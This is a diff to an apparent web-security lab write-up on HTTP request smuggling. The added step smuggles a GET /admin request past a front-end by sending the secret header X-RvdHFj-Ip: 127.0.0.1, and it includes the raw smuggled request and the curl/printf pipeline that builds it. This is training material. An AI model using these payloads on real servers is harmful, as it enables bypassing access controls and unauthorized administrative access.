@@ -97,7 +97,7 @@ To smuggle the request "embed" it in a normal request. The request will include 
 ***The request:***
 ```
 POST / HTTP/1.1
-Host: your-lab-id.web-security-academy.net
+Host: [LAb_URL]
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 124
 Transfer-Encoding: chunked
@@ -144,3 +144,38 @@ cat smuggle_response| grep searc -A 1 -m 1 | cut -d ":" -f 1 | cut -d$'\n' -f2
 ```
 
 **We now have our secret header to overwrite: `X-*-IP`**
+
+### IV - Use secret header to reach admin panel
+
+Smuggle a request with the secret header pointing to 127.0.0.1. We includ it in a smuggled request to prevent it from being rewritten by front-end
+
+```shell
+POST / HTTP/1.1
+Host: [LAB_URL]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0           # <---- End of 1st request for back-end
+
+GET /admin HTTP/1.1        <---- Second request for back-end
+X-*-Ip: 127.0.0.1     # <---- Secret Header
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+```
+
+```shell
+#Launch server
+httpecho -s
+# Construct a POST request to /admin
+curl -s http://localhost:8888/admin --data "x=1" -H "Content-Length: 10" -H "Connection: close" -H 'User-Agent:'  -H 'Accept:' > post_admin
+cat post_admin | httpoverride -H "Host:" -H "X-RvdHFj-Ip: 127.0.0.1" > post_admin_modify
+# Adjust body to smuggle post_admin_modify request
+printf "0\r\n\r\n$(cat post_admin_modify)" > payload
+curl -s -X POST http://localhost:8888/ --data-binary "@payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > smuggle
+# Perform the request
+cat smuggle | httpclient https://$LAB_URL
+```
